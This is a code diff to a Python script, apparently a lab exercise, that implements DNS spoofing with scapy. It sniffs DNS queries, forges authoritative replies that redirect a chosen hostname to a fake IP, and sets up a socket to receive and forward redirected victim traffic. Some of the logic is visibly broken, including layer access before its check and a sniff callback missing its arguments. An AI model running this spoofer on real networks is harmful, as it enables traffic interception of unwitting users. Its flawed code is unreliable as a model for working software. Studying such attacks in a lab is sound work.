@@ -66,31 +66,34 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 
 def dns_callback(packet, extra_args):
     scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR) and scapy_packet:
-        print(f"Received DNSRR from {scapy_packet.getlayer(DNSRR).qd.qname}")
-        if scapy_packet.getlayer(DNSRR).qd.qname != extra_args["hostname"]:
+    qname = scapy_packet.getlayer(DNSRR).qd.qname
+    if scapy_packet.haslayer(DNSRR) and scapy_packet.haslayer(IP):
+        print(f"Received DNSRR from {qname}")
+        if qname != extra_args["hostname"]:
             return
-        dns_response = IP(dst=packet[IP].src) / \
-                       UDP(dport=packet[UDP].sport, sport=53) / \
-                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                           an=DNSRR(rrname=resolver.resolve(), ttl=10, rdata=extra_args['fake_ip']))
+        dns_response = IP(dst=scapy_packet[IP].src) / \
+                       UDP(dport=scapy_packet[UDP].sport, sport=53) / \
+                       DNS(id=scapy_packet[DNS].id, qr=1, aa=1, qd=scapy_packet[DNS].qd,
+                           an=DNSRR(rrname=qname, ttl=10, rdata=extra_args['fake_ip']))
 
         send(dns_response, verbose=0)
-        client_ip = socket.inet_ntoa(scapy_packet.getlayer(IP).src)
-        client_port = struct.unpack("!H", socket.inet_aton(scapy_packet.getlayer()))
+        client_ip = scapy_packet[IP].src
+        client_port = scapy_packet[UDP].sport
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
         client_socket.bind((client_ip, client_port))
-        handle_tcp_forwarding(client_socket, extra_args['fake_ip'], extra_args['target_host'])
+        handle_tcp_forwarding(client_socket, client_ip, extra_args['target_host'])
+
 
 
 def sniff_and_spoof(source_ip):
-    # TODO: Open a socket and bind it to the attacker's IP and WEB_PORT
     # This socket will be used to accept connections from victimized clients
+    socket_at = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket_at.bind(("127.1.1.1", WEB_PORT))
 
-    # TODO: sniff for DNS packets on the network. Make sure to pass source_ip
     # and the socket you created as extra callback arguments.
-    print(f"Sniffing for DNS packets on {source_ip}")
+    sniff(filter=f"udp port 53 and dst {source_ip}", prn=dns_callback, store=0, timeout=0)
 
 
 def main():
